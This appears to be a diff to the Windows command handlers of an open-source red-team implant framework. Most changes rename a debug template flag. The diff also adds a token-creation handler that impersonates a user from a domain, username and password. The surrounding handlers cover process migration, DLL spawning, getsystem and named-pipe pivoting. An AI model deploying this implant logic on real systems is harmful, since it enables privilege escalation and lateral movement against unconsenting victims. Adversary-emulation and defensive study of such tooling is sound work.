@@ -19,7 +19,7 @@ package handlers
 */
 
 import (
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
@@ -50,6 +50,7 @@ var (
 		sliverpb.MsgStartServiceReq:    startService,
 		sliverpb.MsgStopServiceReq:     stopService,
 		sliverpb.MsgRemoveServiceReq:   removeService,
+		sliverpb.MsgEnvReq:             getEnvHandler,
 
 		// Generic
 		sliverpb.MsgPsReq:        psHandler,
@@ -67,8 +68,9 @@ var (
 
 		sliverpb.MsgScreenshotReq: screenshotHandler,
 
-		sliverpb.MsgSideloadReq: sideloadHandler,
-		sliverpb.MsgNetstatReq:  netstatHandler,
+		sliverpb.MsgSideloadReq:  sideloadHandler,
+		sliverpb.MsgNetstatReq:   netstatHandler,
+		sliverpb.MsgMakeTokenReq: makeTokenHandler,
 	}
 
 	windowsPivotHandlers = map[uint32]PivotHandler{
@@ -92,7 +94,7 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 	impersonateReq := &sliverpb.ImpersonateReq{}
 	err := proto.Unmarshal(data, impersonateReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -113,7 +115,7 @@ func runAsHandler(data []byte, resp RPCResponse) {
 	runAsReq := &sliverpb.RunAsReq{}
 	err := proto.Unmarshal(data, runAsReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -130,7 +132,7 @@ func runAsHandler(data []byte, resp RPCResponse) {
 }
 
 func revToSelfHandler(_ []byte, resp RPCResponse) {
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Println("Calling revToSelf...")
 	//{{end}}
 	taskrunner.CurrentToken = windows.Token(0)
@@ -139,7 +141,7 @@ func revToSelfHandler(_ []byte, resp RPCResponse) {
 	if err != nil {
 		revToSelf.Response = &commonpb.Response{Err: err.Error()}
 	}
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Println("revToSelf done!")
 	//{{end}}
 	data, err := proto.Marshal(revToSelf)
@@ -150,7 +152,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 	getSysReq := &sliverpb.InvokeGetSystemReq{}
 	err := proto.Unmarshal(data, getSysReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -165,13 +167,13 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 }
 
 func executeAssemblyHandler(data []byte, resp RPCResponse) {
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Println("executeAssemblyHandler called")
 	//{{end}}
 	execReq := &sliverpb.ExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
@@ -189,19 +191,19 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 }
 
 func migrateHandler(data []byte, resp RPCResponse) {
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
 	migrateReq := &sliverpb.InvokeMigrateReq{}
 	err := proto.Unmarshal(data, migrateReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
 	}
 	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
 	migrateResp := &sliverpb.Migrate{Success: true}
@@ -210,7 +212,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		migrateResp.Response = &commonpb.Response{
 			Err: err.Error(),
 		}
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("migrateHandler: RemoteTask failed:", err)
 		// {{end}}
 	}
@@ -223,12 +225,12 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	err := proto.Unmarshal(data, spawnReq)
 
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		return
 	}
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
 	//{{end}}
 	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs())
@@ -247,7 +249,7 @@ func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transport
 	namedPipeReq := &sliverpb.NamedPipesReq{}
 	err := proto.Unmarshal(envelope.Data, namedPipeReq)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
 		namedPipeResp := &sliverpb.NamedPipes{
@@ -263,7 +265,7 @@ func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transport
 	}
 	err = pivots.StartNamedPipeListener(namedPipeReq.GetPipeName())
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error with listener: %s", err.Error())
 		// {{end}}
 		namedPipeResp := &sliverpb.NamedPipes{
@@ -285,6 +287,23 @@ func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transport
 		ID:   envelope.GetID(),
 		Data: data,
 	}
+}
+
+func makeTokenHandler(data []byte, resp RPCResponse) {
+	makeTokenReq := &sliverpb.MakeTokenReq{}
+	err := proto.Unmarshal(data, makeTokenReq)
+	if err != nil {
+		return
+	}
+	makeTokenResp := &sliverpb.MakeToken{}
+	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password)
+	if err != nil {
+		makeTokenResp.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
+	}
+	data, err = proto.Marshal(makeTokenResp)
+	resp(data, err)
 }
 
 func startService(data []byte, resp RPCResponse) {
